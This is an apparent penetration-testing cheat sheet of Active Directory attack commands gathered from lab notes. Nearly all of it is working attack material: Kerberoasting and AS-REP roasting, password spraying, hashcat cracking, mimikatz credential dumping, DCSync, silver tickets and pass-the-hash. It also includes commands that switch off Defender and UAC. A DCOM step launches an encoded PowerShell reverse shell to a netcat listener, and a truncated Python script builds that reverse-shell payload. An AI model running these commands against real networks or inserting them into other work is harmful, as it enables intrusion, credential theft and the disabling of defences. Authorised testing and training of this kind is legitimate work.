## Active Directory General Checklist

> Source: `01101100-C0D3X-00110110.md` → `Detailed Checklists > Active Directory General Checklist`

1. Define the primary target.
2. Reference the [Pentest AD Mindmap](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg).
3. Use SharpHound and BloodHound for enumeration.
4. Remember, **Enumeration is key;** repeat the process for each user owned.
5. Proceed to the enumeration checklist.
6. Review Kerberos-related checklists.
7. Attempt DCSync and DCShadow attacks.
8. Run Responder.
9. If a mail server is present, send an email with `config.Library-ms`.
10. Use `enum4linux` for enumeration.
11. Discover the Sysvol share from the Domain Controller.
12. After obtaining a shell with `psexec`, check permissions.
13. Perform an LDAP dump with `ldapdomaindump` and check descriptions.
14. Use `jq` to parse JSON data for interesting fields.
15. Reference [Active Directory Enumeration - Pentest Everything](https://pentesteverything.gitbook.io/pentest-everything/penetration-testing/enumeration/active-directory-enumeration) for additional techniques.
16. Recollect data with BloodHound if stuck.
17. Repeat enumeration steps—**Enumeration is key; try harder.**
18. Verify all findings and ensure no steps were missed.


## Active Directory with Credentials Checklist

> Source: `01101100-C0D3X-00110110.md` → `Detailed Checklists > Active Directory with Credentials Checklist`

1. Define your goal and act accordingly.
2. Add the Domain Controller's hostname to `/etc/hosts`.
3. Check the current user.
4. Check current user group memberships:

```bash
whoami /groups /fo list | findstr Name
```

5. Identify the Domain Controller:

```powershell
Get-NetDomain
```

6. Identify domain admins:

```bash
net group "Domain Admins" /domain
```

7. Check for domain trusts.
8. Run Responder.
9. Check for SMB null sessions.
10. Check users' domain group memberships present on the current host:

```bash
net user username /domain
```

11. Identify service accounts and hosts related to them.
12. Find who is logged on to different hosts.
13. Check local admin groups and other local groups.
14. Use `Find-LocalAdminAccess`.
15. Find users with reversible encryption.
16. Check domain admin group and other domain groups.
17. Check enterprise admin group.
18. Check Organizational Units (OUs):

```powershell
Get-ADOrganizationalUnit -Filter * | Select-Object Name, DistinguishedName
```

19. Use `impacket-rpcdump` for RPC enumeration.
20. Identify the Primary Domain Controller (PDC).
21. Check for disabled accounts that may be admin.
22. Attempt DCSync and use `ldapdomaindump`.
23. Check for passwords in comments, descriptions, or other fields.
24. Parse BloodHound exports for interesting properties using `jq`:

```bash
cat domain_users.json | jq '.[] | select(.attributes.description != null and .attributes.description[0] != null) | {sAMAccountName: .attributes.sAMAccountName[0], description: .attributes.description[0]}'
```

25. Enumerate computers in the domain.
26. Discover the Sysvol share from the Domain Controller.
27. Find domain admins' sessions on different PCs.
28. Find old devices.
29. Mount all accessible shares and inspect them thoroughly.
30. Check if the current user has local admin permissions on other PCs with `Find-LocalAdminAccess`.
31. Check ACLs and ACEs for the current user:

```powershell
Find-InterestingDomainAcl | select ObjectDN, AceType
```

32. Check if the user has ACL permissions on groups.
33. Check if the user can reset passwords for other users.
34. Examine the local host thoroughly.
35. Check local admins with `Find-LocalAdminAccess`.
36. Use BloodHound, SharpHound, and RustHound for enumeration.
37. Check AD object descriptions.
38. Parse JSON data for descriptions using `jq`:

```bash
cat bloodhound_users.json | jq '.data[] | select(.Properties.description != null) | {samaccountname: .Properties.name, description: .Properties.description}'
```

39. Check local admins of Domain Controllers.
40. In BloodHound, check outbound object control of owned users.
41. Find ASREPRoastable users.
42. Request AS_REP messages with `impacket-GetNPUsers`:

```bash
impacket-GetNPUsers domain.com/username:'Password123!' -dc-ip 192.168.123.100 -request -o ./oscp.kerb
```

43. Find Kerberoastable users.
44. Enumerate SPNs with `nxc ldap`:

```bash
nxc ldap 192.168.123.0/24 -u 'username' -p 'password' --kerberoast spns.txt
```

45. Repeat enumeration steps—**Enumeration is key; try harder.**
46. Verify all findings and ensure no steps were missed.


## Active Directory without Credentials Checklist

> Source: `01101100-C0D3X-00110110.md` → `Detailed Checklists > Active Directory without Credentials Checklist`

1. Add the Domain Controller's hostname to `/etc/hosts`.
2. Enumerate users with Kerbrute:

```bash
/Tools/kerbrute_linux_amd64 userenum -d domain.com --dc 192.168.123.100 $SECLIST/Usernames/Names/names.txt
```
    
4. Use wordlists like [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames/tree/master/facebook-base-lists).
5. Merge wordlists to create a comprehensive `names.txt`:

```bash
cat *.txt | sort -u > allnames.txt
```

6. Request AS_REP messages:

```bash
impacket-GetNPUsers domain.com/ -usersfile adcreds.txt -dc-ip 192.168.123.100 -request -outputfile hash.hash
```

    [ASREPRoast HackTricks Guide](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast#request-as_rep-message)

7.Continue using Kerbrute until you have the naming schema, lots of users, and service accounts. Refer to [service-accounts.txt](https://github.com/crtvrffnrt/wordlists/blob/main/service-accounts.txt).
8. Try using the username as the password.
9. Identify the Domain Controller.
10. Run Responder.
11. Use `rpcclient` for RPC enumeration:

```bash
rpcclient 192.168.123.100 -U ""
rpcclient 192.168.123.100 -U "domain.com\guest"
```

12. Use more `rpcclient` commands:

```bash
    rpcclient -U 'domain.com\guest' -c "
        srvinfo;
        enumdomusers;
        queryuserdomainsid;
        enumgroups;
        enumdomgroups;
        enumprinters;
        enumservices;
        getdompwinfo;
        lsaenumsid;
        lsaqueryinfopol;
        querydispinfo;
        enumtrustdom;
        netshareenum;
        samrlookuprids;
    " 192.168.123.100
```

13. Check all SIDs with:

```bash
:lookupsids S-1-5-80-...
```

14. Check for SMB null sessions.
15. Check for SMB guest sessions.
16. Use `nxc smb` to enumerate shares:

```bash
nxc smb 192.168.123.100 -u "a" -p "" --shares
nxc smb 192.168.123.100 -u "guest" -p "" --shares
```

17. Use `enum4linux` for additional enumeration:

```bash
enum4linux -a 192.168.123.100
```

18. Use `impacket-rpcdump` for RPC enumeration.
19. Attempt anonymous LDAP dumps with `ldapdomaindump`:

```bash
ldapdomaindump 192.168.123.100
```

20. Use `ldapsearch` for LDAP enumeration:

```bash
ldapsearch -x -h 192.168.123.100 -b "dc=domain,dc=com"
```

21. Repeat enumeration steps—**Enumeration is key; try harder.**
22. Verify all findings and ensure no steps were missed.


## Initial Enumeration

> Source: `01101100-C0D3X-00110110.md` → `Active Directory > Initial Enumeration`

```
# Performs a ping sweep on the specified network segment from a Linux-based host
fping -asgq 172.16.5.0/23

# Runs the Kerbrute tool to discover usernames in the domain (INLANEFREIGHT.LOCAL) specified proceeding the -d option and the associated domain controller specified proceeding --dcusing a wordlist and outputs (-o) the results to a specified file. Performed from a Linux-based host.
./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results
```


## LLMNR Poisoning

> Source: `01101100-C0D3X-00110110.md` → `Active Directory > Initial Enumeration > LLMNR Poisoning`

```
# Uses hashcat to crack NTLMv2 (-m) hashes that were captured by responder and saved in a file (frond_ntlmv2). The cracking is done based on a specified wordlist.
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```

```
# Uses CME to extract  password policy
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

# Uses rpcclient to discover information about the domain through SMB NULL sessions. Performed from a Linux-based host.
rpcclient -U "" -N 172.16.5.5

# Uses rpcclient to enumerate the password policy in a target Windows domain from a Linux-based host.
rpcclient $> querydominfo

# Uses ldapsearch to enumerate the password policy in a target Windows domain from a Linux-based host.
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# Used to enumerate the password policy in a Windows domain from a Windows-based host.
net accounts

# PowerView Command used to enumerate the password policy in a target Windows domain from a Windows-based host.
Get-DomainPolicy

# Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.
rpcclient -U "" -N 172.16.5.5 rpcclient $> enumdomuser

# Uses CrackMapExec to discover users (--users) in a target Windows domain from a Linux-based host.
crackmapexec smb 172.16.5.5 --users

# Uses ldapsearch to discover users in a target Windows doman, then filters the output using grep to show only the sAMAccountName from a Linux-based host.
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "

# Uses kerbrute and a list of users (valid_users.txt) to perform a password spraying attack against a target Windows domain from a Linux-based host.
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1

# Uses CrackMapExec and the --local-auth flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using grep.
sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

# Performs a password spraying attack and outputs (-OutFile) the results to a specified file (spray_success) from a Windows-based host.
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

```
# Check if Defender is enabled
Get-MpComputerStatus
Get-MpComputerStatus | Select AntivirusEnabled

# Check if defensive modules are enabled
Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL

# Check if tamper protection is enabled
Get-MpComputerStatus | Select IsTamperProtected,RealTimeProtectionEnabled | FL

# Check for alternative Av products
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct

# Disabling UAC
cmd.exe /c "C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"

# Disables realtime monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Disables scanning for downloaded files or attachments
Set-MpPreference -DisableIOAVProtection $true

# Disable behaviour monitoring
Set-MPPreference -DisableBehaviourMonitoring $true

# Make exclusion for a certain folder
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# Disables cloud detection
Set-MPPreference -DisableBlockAtFirstSeen $true

# Disables scanning of .pst and other email formats
Set-MPPreference -DisableEmailScanning $true

# Disables script scanning during malware scans
Set-MPPReference -DisableScriptScanning $true

# Exclude files by extension
Set-MpPreference -ExclusionExtension "ps1"

# Turn off everything and set exclusion to "C:\Windows\Temp"
Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# Bypassing with path exclusion
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# PowerShell cmd-let used to view AppLocker policies from a Windows-based host.
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

```
# PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host
Get-Module

# Loads the Active Directory PowerShell module from a Windows-based host.
Import-Module ActiveDirectory

# PowerShell cmd-let used to gather Windows domain information from a Windows-based host.
Get-ADDomain

# PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by ServicePrincipalName. Performed from a Windows-based host.
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (-Filter *). Performed from a Windows-based host.
Get-ADTrust -Filter * | select name

# PowerShell cmd-let used to discover the members of a specific group (-Identity "Backup Operators"). Performed from a Windows-based host.
Get-ADGroupMember -Identity "Backup Operators"
```


## Miscellanous Configurations

> Source: `01101100-C0D3X-00110110.md` → `Active Directory > Initial Enumeration > Miscellanous Configurations`

```
# SecurityAssessment.ps1 based tool used to enumerate a Windows target for MS-PRN Printer bug. Performed from a Windows-based host.
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

# PowerView tool used to display the description field of select objects (Select-Object) on a target Windows domain from a Windows-based host.
Get-DomainUser * | Select-Object samaccountname,description

# PowerView tool used to check for the PASSWD_NOTREQD setting of select objects (Select-Object) on a target Windows domain from a Windows-based host.
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```


## Hydra

> Source: `01101100-C0D3X-00110110.md` → `Active Directory > Initial Enumeration > Hydra`

```
# Basic Auth Brute Force - User/Pass Wordlists
hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /

# Login Form Brute Force - Static User, Pass Wordlist
hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```


## NETEXEC WINRM ENUM? (→ ne_winrm.txt)

> Source: `01101100-C0D3X-00110110.md` → `NETEXEC WINRM ENUM? (→ ne_winrm.txt)`

```bash
netexec winrm online -u '' -p '' --exec whoami |tee ne_winrm.txt
```


## NETEXEC MSSQL INFO? (→ ne_mssql.txt)

> Source: `01101100-C0D3X-00110110.md` → `NETEXEC MSSQL INFO? (→ ne_mssql.txt)`

```bash
netexec mssql online -u '' -p '' |tee ne_mssql.txt
```


## KERBRUTE USER ENUM? (→ kerbrute_valid.txt)

> Source: `01101100-C0D3X-00110110.md` → `KERBRUTE USER ENUM? (→ kerbrute_valid.txt)`

```bash
kerbrute userenum --dc <dc_ip> -d <domain> users.txt 2>/dev/null |tee kerbrute_valid.txt
```

############################################


## RDP using Netexec (nxc)

> Source: `01101100-C0D3X-00110110.md` → `Exploitation > Password Attacks > Hydra > RDP using Netexec (nxc)`

```bash
nxc rdp 192.168.217.227 -u nadine -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```


## AD

> Source: `01101100-C0D3X-00110110.md` → `AD`

If enumerating AD from remote WinRM or PowerShell, you may run into [Kerberos Double-Hop Issue](https://posts.slayerlabs.com/double-hop/)... To avoid it, the simplest way is to use RDP.

1. Nmap Port Scan subnet
2. Enumerate with PowerUp.ps1
3. Enumerate with WinPEAs
4. Enumerate with BloodHound
	1. PrivEsc as needed
	2. mimikatz
```
token::elevate
token::revert
vault::cred
vault::list
lsadump::sam
lsadump::secrets
lsadump::cache
lsadump::dcsync /<USERNAME>:<DOMAIN>\krbtgt /domain:<DOMAIN>
```
1. Make users.txt
2. Use found passwords/policies/hashes
	1. cme, netexec, kerbrute

---

- Using BloodHound CE/SharpHound:
	- SharpHound for data collection to be used with BloodHound:
		- Transfer SharpHound to Target
			- `powershell -ep bypass`
			- `Import-Module .\Sharphound.ps1`
			- Begin data collection of domain data for BloodHound from the Target
				- `Get-Help Invoke-BloodHound`
				- `Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "Collected Data"`
					- `-d <domain>`
				- `dir C:\Users\stephanie\Desktop\`
	- ==BloodHound== CE for Domain Enumeration:
		- From Kali:
			- `sudo systemctl start docker`
			- `sudo systemctl status docker`
			- `sudo systemctl enable docker`
			- `sudo ./bloodhound-cli install` --- Only use BloodHound Community Edition
				- [Quickstart](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)
			- Log in to the Neo4j Database using creds
			- Transfer SharpHound zip file from Windows Target to Kali
			- In BloodHound GUI, go to *Administration > File Ingest > Upload Files* and Drop zip file into BloodHound's main window.
			- Analyze data (Explore):
				- **CLICK FOLDER FOR PREBUILT QUERIES!**
				- [Cyphers](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
				- Pathfinding, select a node and poke around...
				- [Object Permissions](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html?highlight=genericall#genericall-rights-on-group)
```plaintext
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```
> Valuable AD permission types
- If GenericAll on User, change their password and login:
	- `net user <user> <pass> /domain`
- If GenericAll on Group, add the user to the group
	- `net group "domain admins" <user> /add /domain`
- If NOT using BloodHound CE and using BloodHound (unlikely):
		- Alternative to SharpHound, run this ingestor from Kali:
			- `sudo bloodhound-python -d MARVEL.local -u fcastle -p Password1 -ns <DC_IP> -c all`
			- `sudo neo4j start`
			- Click or navigate to: [`http://localhost:7474`](http://localhost:7474/)
				- Authenticate with `neo4j:neo4j` and change the password (`neo4j1`)
			- `bloodhound`

---
If you forgot the password, you can reset it:

1. **Stop the BloodHound container** (if you're using Docker):
    `docker stop bloodhound`
2. **Start Neo4j in a way that allows password reset**:  
    `docker run \   -e NEO4J_AUTH=none \   -p 7474:7474 -p 7687:7687 \   neo4j`
3. **Access Neo4j Browser** at [http://localhost:7474](http://localhost:7474) and run:
    `CALL dbms.changePassword('newpassword')`
4. **Restart your BloodHound container** with:
    `docker run -d \   -e NEO4J_AUTH=neo4j/newpassword \   -p 7474:7474 -p 7687:7687 -p 8080:8080 \   --name bloodhound \   bloodhound:latest`


## 🧪 4. **Check Logs**

> Source: `01101100-C0D3X-00110110.md` → `AD > 🧪 4. **Check Logs**`

If resetting doesn't help, check BloodHound CE logs for errors:
or, if running via CLI directly:
`journalctl -u bloodhound -f`


## 🛠️ 5. **Recreate BloodHound Container**

> Source: `01101100-C0D3X-00110110.md` → `AD > 🛠️ 5. **Recreate BloodHound Container**`

If everything fails:
1. Remove current container:
2. Recreate it fresh with:
    `docker run -d \   -e NEO4J_AUTH=neo4j/bloodhound \   -p 7474:7474 -p 7687:7687 -p 8080:8080 \   --name bloodhound \   bloodhound:latest`

---
- NTLM - challenge and response based authentication
	- get em with mimikatz or other files
	- crack em' with hashcat
		- USE bestrule64.rule AND rockyou-30000.rule
			- `/usr/share/hashcat/rules/`
			- Cut wordlist to 6-12 characters
				- `sed '/^.{6,12}$/!d' /usr/share/wordlists/rockyou.txt > rockyou-6to12.txt`
			- Cut down wordlist to 10,000
				- `sed -n '1,10000p' /usr/share/wordlists/rockyou.txt > rockyou-10000.txt`
	- `responder -I <interface> -A`
		- use this for OSCP, `-A` analyze mode does not respond (spoof/poison)
	- `Coercer.py -d <DOMAIN> -u <USER> -p <PASS> -t <TARGET_IP>`
- Cached AD Creds
	- [mimikats](https://adsecurity.org/?page_id=1821)
		- Run CMD/PowerShell as Administrator (may need to PrivEsc for LOCAL\\AUTHORITY)
		- `.\mimikatz.exe`
		- `privilege::debug`
		- `sekurlsa::logonpasswords` — (LSA Secrets = LSASS)
			- Crack passwords
			- PtH
		- `sekurlsa::tickets`
			- Steal a TGS to access a resource
			- Steal a TGT to request a TGS for a specific resource
- Kerberos - ticket based authentication
	- AS-REQ & AS-REP (1)
		- GetNPUsers
			- Need Domain User creds
				- If needed, enable " *Do not require Kerberos preauthentication"* manually
					- To identify users with the enabled AD user account option " *Do not require Kerberos preauthentication"*, we can use *impacket-GetNPUsers* without the **\-request** and **\-outputfile** options.
					- `impacket-GetNPUsers -dc-ip 192.168.50.70 corp.com/pete`
					- If no users have this enabled, but we have [GenericWrite or GenericAll](https://adsecurity.org/?p=3658) on another AD user account, modify the UAC value of the user to not require [Kerberos preauth](https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/) (Targeted AS-REP Roasting), or reset that user's account.
				- `impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete`
				- `hashcat --help | grep -i "Kerberos"`
				- `sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
		- If needed, enable " *Do not require Kerberos preauthentication"* manually
			- To identify users with the enabled AD user account option *Do not require Kerberos preauthentication*, we can use PowerView's *Get-DomainUser* function with the option **\-PreauthNotRequired** on Windows.
			- `powershell -ep bypass`
			- `Import-Module .\PowerView.ps1`
			- `Get-DomainUser -PreauthNotRequired`
			- If no users have this enabled, but we have [GenericWrite or GenericAll](https://adsecurity.org/?p=3658) on another AD user account, modify the UAC value of the user to not require [Kerberos preauth](https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/) (Targeted AS-REP Roasting), or reset that user's account.
			- `powershell -ep bypass`
			- `.\Rubeus.exe asreproast /nowrap`
			- `sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
	- TGS-REQ & TGS-REP (2)
		- `nxc ldap 192.168.147.70 -u jeff -p 'HenchmanPutridBonbon11' --kerberoasting output.txt` --- add DC IP and DNS to `/etc/hosts`
		- `.\Rubeus.exe kerberoast /outfile:hashes.kerberoast`
			- If no SPNs, but we have [GenericWrite or GenericAll](https://adsecurity.org/?p=3658) on another AD user account, we could reset the user's password, but this may raise suspicion. However, we could also set an [SPN for the user](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241\(v=ws.11\)), kerberoast the account, and crack the password hash in an attack named *targeted Kerberoasting*. `setspn -A servicegigs/user1.corp.com user1`
		- `hashcat --help | grep -i "Kerberos"`
		- `sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
	- AP-REQ & AP-REP
		- `nxc ldap 192.168.147.70 -u jeff -p 'HenchmanPutridBonbon11' --kerberoasting output.txt` --- add DC IP and DNS to `/etc/hosts`
		- GetUserSPN
			- `sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete`
				- error " `KRB_AP_ERR_SKEW(Clock skew too great)`," we need to synchronize the time of the Kali machine with the domain controller. We can use [*ntpdate*](https://en.wikipedia.org/wiki/Ntpdate) or [*rdate*](https://en.wikipedia.org/wiki/Rdate) to do so.
				- `sudo ntpdate <IP>`
				- If no SPNs, but we have [GenericWrite or GenericAll](https://adsecurity.org/?p=3658) on another AD user account, we could reset the user's password, but this may raise suspicion. However, we could also
				- `sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
				- pass around
					- `nxc`
					- `bloodyAD`
					- `psexec`, etc.
	- Silver Ticket (3)
		- Need to collect three data points:
			1. SPN password hash
				1. `powershell -ep bypass`
				2. `.\mimikatz.exe`
				3. `privilege::debug`
				4. `sekurlsa::logonpasswords`
			2. Domain SID
				1. `whoami /all`
					- `S-1-5-21-1987370270-658905905-1781884369-1105`
			3. Target SPN
				1. `setspn -L hostname`
				2. `Get-ADServiceAccount -Filter 'ServicePrincipalNames -like "*" | Select-Object -ExpandProperty ServicePrincipalNames`
					1. e.g. `HTTP/web04.corp.com:80`
		- Create Silver Ticket in mimikatz
			- `kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin`
		- Confirm ticket is ready
			- `klist`
		- Lab-specific proof location
			- `iwr -UseDefaultCredentials http://web04 | findstr /i OS{`
- Certipy & nxc to find certificate templates and list vulnerable ESCs
```bash
nxc ldap 10.10.11.72 -u users.txt -p pass.txt -M adcs

nxc ldap 10.10.11.72 -u users.txt -p pass.txt -M adcs -o SERVER=tombwatcher-CA-1

certipy find -u 'alfred@tombwatcher.htb' -p 'basketball' -dc-ip '10.10.11.72' -text -enabled -hide-admins
```
- Domain Controller Synchronization (dsync) (4)
	- Performing a [*dcsync*](https://adsecurity.org/?p=2398#MimikatzDCSync) attack in which we impersonate a domain controller requires a user to have the *Replicating Directory Changes*, *Replicating Directory Changes All*, and *Replicating Directory Changes in Filtered Set* rights.
		- By default, members of the *Domain Admins*, *Enterprise Admins*, and *Administrators* groups have these rights assigned.
	- mimikatz - dcsync Method 1
		- `.\mimikatz.exe`
		- `privilege::debug`
		- `lsadump::dcsync /user:corp\dave`
		- `lsadump::dcsync /user:corp\Administrator`
		- `hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
	- impacket-secretsdump - dcsync Method 2
		- `impacket-secretsdump -just-dc-user krbtgt corp.com/jeffadmin:'BrouhahaTungPerorateBroom2023!'@192.168.50.70`
		- `hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

---

- Be aware of account lockouts.
	- `net accounts`
		- `Lockout threshold:             4`
	- Set Lockout threshold to the result
		- `nxc rdp targets.txt -u users.txt -p pass.txt --ufail-limit 3 --gfail-limit 10 --continue-on-success`
- [netexec](https://www.netexec.wiki/smb-protocol/password-spraying)
	- `crackmapexec smb <ip> -u users.txt -p <pass> -d dc.com --continue-on-success`
	- `netexec smb <ip/CIDR> -u <user> -d <domain> -p <pass>`
	- `netexec smb <ip/CIDR> -u <user> -H <hash> --local-auth`
	- `netexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --sam`
	- `netexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --lsa`
	- `netexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --shares`
	- Avoid lockouts:

| Flag                      | What it does                                                            |
| ------------------------- | ----------------------------------------------------------------------- |
| `--no-bruteforce`         | Disables all username/password brute-forcing.                           |
| `--lockout-threshold <n>` | Stop trying passwords after `<n>` authentication failures per user.     |
| `--delay <seconds>`       | Delay between each authentication attempt (good for staying stealthy).  |
| `--jitter <percentage>`   | Randomizes the delay a little (helps avoid detection by IR tools).      |
| `--continue-on-success`   | After a successful login, **stop** trying more passwords for that user. |

- [Kerbrute](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
	- Transfer kerbrute to Windows
	- `.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"`
		- If network error, make sure that the encoding of **usernames.txt** is *ANSI*. You can use Notepad's *Save As* functionality to change the encoding.
- [mssqlpwner](https://github.com/ScorpionesLabs/MSSqlPwner) - NOT ALLOWED
	- `mssqlpwner -hashes ':0CB6948805F797BF2A82807973B89537' 'Administrator'@172.16.2.12 -windows-auth interactive`
- DirectoryEntry (cme alternative) - LDAP and ADSI, low and slow password attack, save as "Spray-Passwords.ps1"
```Powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```
- `powershell -ep bypass`
- `.\Spray-Passwords.ps1 -Pass Nexus123! -Admin`

---

- netexec
- PtH
	- Netexec (nxc), PsExec, Impacket-smbclient, [pth toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
	- Requirements
		1. The user that authenticates to the target machine must be part of the Administrators local group.
		2. SMB connection
		3. The ADMIN$ share must be available
		4. Windows File and Printer Sharing has to be turned on
	- `/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73`
- Overpass the Hash (OPtH) - mimikatz
	- Need to cache Admin user's credentials:
		- Open Notepad as another user
	- Transfer mimikatz to Windows target
		- `.\mimikatz.exe` as Admin
		- `privilege::debug`
		- `sekurlsa::logonpasswords`
			- Confirm NTLM for Admin user is stored
		- `sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell`
		- In new PS session
			- `klist` -- shows no TGT, must generate
			- `net use \\files04` -— generates TGT
				- used `net use` but can use any command that requires domain permissions
			- `klist`
		- Log into next target using TGT
			- `.\PsExec.exe \\files04 cmd`
				- Can use any tool that relies on Kerberos authentication
- Pass the Ticket (PTT)
	- `whoami`
	- `ls \\web04\backup` - Prove access to a path is denied
	- Transfer `mimikatz` and run as Admin
		- `privilege::debug`
		- `sekurlsa::tickets /export`
			- TGT/TGS in memory is saved to disk in the kirbi mimikatz format.
			- In PowerShell `dir *.kirbi`
		- `kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi`
			- `klist` - to confirm the ticket is in our session... May show `(0)` but still work
			- `ls \\web04\backup` - prove we have access now
- DCOM
	- PowerShell as admin
```Powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))`
```
- specify IP as next Windows Target IP
```Powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```
- dcom variable sending full base64 encoded (using python script below) PowerShell reverse shell
	- Kali
		- `nc -lnvp 443`
- Cleartext passwords
- Pivot
- PsExec
	- Requirements:
		1. The user that authenticates to the target machine must be part of the Administrators local group.
		2. The ADMIN$ share must be available
		3. Windows File and Printer Sharing has to be turned on
	- Transfer `PsExec64.exe` to the Windows target
		- `.\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd`
- WinRM - `winrs`
	- Encoded payload python script:
```python
import sys
import base64

payload = """$client = New-Object System.Net.Sockets.TC$
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne$
    $data = (New-Object -TypeName System.Text.ASCIIEnco$
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($send$
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
"""

